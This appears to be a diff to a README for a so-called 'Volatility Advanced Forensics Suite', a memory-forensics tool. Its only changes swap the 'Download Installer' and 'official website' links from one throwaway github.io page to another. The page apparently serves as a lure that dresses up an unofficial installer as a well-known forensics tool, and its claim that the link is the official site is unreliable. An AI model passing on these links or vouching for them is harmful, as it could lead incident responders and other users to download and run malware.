@@ -2,7 +2,7 @@
 
 The Volatility Advanced Forensics Suite is a cutting-edge memory forensics tool designed for 2026 and beyond, empowering cybersecurity professionals with robust capabilities for deep memory analysis. This tool streamlines the process of investigating RAM dumps, detecting malware, and extracting critical artifacts from volatile memory, making it an essential asset for incident response and digital investigations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -44,6 +44,6 @@ A: Absolutely! The suite allows users to develop and integrate custom plugins us
 
 To get the latest version of the Volatility Advanced Forensics Suite, visit the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer, documentation, and additional resources to maximize your memory forensics capabilities. Remember to always use this tool responsibly and in compliance with legal standards for digital investigations.
